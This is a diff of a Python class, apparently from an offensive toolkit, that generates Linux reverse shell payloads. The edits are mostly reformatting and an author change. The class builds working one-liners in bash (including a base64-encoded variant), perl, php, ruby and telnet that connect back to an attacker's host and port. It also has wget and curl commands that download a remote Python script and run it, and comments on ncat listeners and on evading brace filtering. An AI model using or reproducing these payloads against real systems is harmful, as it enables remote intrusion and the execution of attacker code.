@@ -2,11 +2,12 @@
 from base64 import b64encode
 from config import *
 
+
 class Shell:
     def __init__(self):
         self.info = {
             'Name': 'Linux Reverse Shell',
-            'Author': 'whois',
+            'Author': 'nul1',
             'Update': '2018/9/15',
         }
 
@@ -44,10 +45,10 @@ Escape character is '^]'.
 ncat -lvp 8181   //输入命令
 ncat -lvp 8888   //接受命令
 
-"""        
+"""
 
     def bash_reverse(self, ip=LHOST, port=LPORT):
-        bash =  "bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ip, port)
+        bash = "bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ip, port)
         java = "bash -c {echo," + b64encode(bash.encode('utf-8')).decode('utf-8') + "}|{base64,-d}|{bash,-i}"
         return bash + "\n" + java
 
@@ -56,7 +57,8 @@ ncat -lvp 8888   //接受命令
 
     def perl_reverse(self, ip=LHOST, port=LPORT):
         # 注意对{}的过滤，测试ok
-        return "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port)
+        return "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(
+            ip, port)
 
     def telnet_reverse(self):
         return "telnet 10.10.10.2 8181 | /bin/bash | telnet 10.10.10.2 8888"
@@ -65,10 +67,12 @@ ncat -lvp 8888   //接受命令
         return "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)
 
     def ruby_reverse(self, ip=LHOST, port=LPORT):
-        return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{0}\",\"{1}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'".format(ip, port)
+        return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{0}\",\"{1}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'".format(
+            ip, port)
 
     def wget_reverse(self, ip=LHOST, port=LPORT):
-        return "wget http://{0}/back.py -P /tmp/;python /tmp/back.py {0} {1}\n\ncurl http://{0}/back2.py | python -".format(ip, port)
+        return "wget http://{0}/back.py -P /tmp/;python /tmp/back.py {0} {1}\n\ncurl http://{0}/back2.py | python -".format(
+            ip, port)
 
     def linux_tips(self):
         return """
